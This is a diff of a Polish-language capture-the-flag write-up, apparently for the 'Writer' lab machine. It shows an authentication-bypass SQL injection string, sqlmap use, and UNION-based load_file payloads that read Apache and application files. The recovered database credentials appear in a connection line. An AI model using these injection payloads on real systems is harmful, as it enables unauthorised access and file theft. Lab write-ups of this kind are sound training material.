@@ -35,13 +35,20 @@ Wynik skanowania wfuzz
 * Na stronie dostępny jest panel logowania administratora, pierwszym krokiem zostało sprawdzenie czy zadziała SQLi w tym celu użyto w polu loginu frazy `username ' or '1'='1`. Logowanie powiodło się, następnie wykorzystano sqlmap w celu sprawdzenia jaka jest skonfigurowana baza danych i użyto danych z formularza do logowania `uname=username'+or+'1'='1&password=test`.
 Wynik prezentuje się następująco:
 
-![sql](https://user-images.githubusercontent.com/52716721/141515155-42fd0ef6-dd41-4529-9628-a86b3fde97fd.png)
+![image](https://user-images.githubusercontent.com/52716721/143478884-83138642-c297-49ad-b8b9-b0a13311ad73.png)
 
 ![image](https://user-images.githubusercontent.com/52716721/141533062-d4f0b4b6-4639-486f-bd20-947c012012d5.png)
 ![image](https://user-images.githubusercontent.com/52716721/141533167-0eb874b8-da4b-470f-af05-8a3f6688f1bd.png)
 ![image](https://user-images.githubusercontent.com/52716721/141533938-7c74d7bb-2572-46cb-9c1b-6d3e69b38044.png)
-![image](https://user-images.githubusercontent.com/52716721/141538424-7dc4155e-2069-444b-84bc-52e3b1423fa6.png)
-![image](https://user-images.githubusercontent.com/52716721/141538446-29f86d74-0f14-4c76-a043-a88f993a633c.png)
+![image](https://user-images.githubusercontent.com/52716721/143478354-b7a9d660-18e8-4735-8002-3e3601dabfc1.png)
+uname=username' UNION ALL SELECT NULL,load_file("/etc/apache2/sites-enabled/000-default.conf"),NULL,NULL,NULL,NULL-- -&password=test
+uname=username' UNION ALL SELECT NULL,load_file("/var/www/writer.htb/writer.wsgi"),NULL,NULL,NULL,NULL-- -&password=test
+![image](https://user-images.githubusercontent.com/52716721/143478809-566682a5-ca8f-4eb5-a72b-a2b08fc40f60.png)
+![image](https://user-images.githubusercontent.com/52716721/143479464-bab8af2c-5c28-4e29-bc21-90d08b245957.png)
+![image](https://user-images.githubusercontent.com/52716721/143479566-63bc8a3a-1baa-404d-bb12-aa454b7ced0a.png)
+connector = mysql.connector.connect(user=&#39;admin&#39;, password=&#39;ToughPasswordToCrack&#39;, host=&#39;127.0.0.1&#39;, database=&#39;writer&#39;)
+
+
 
 
 
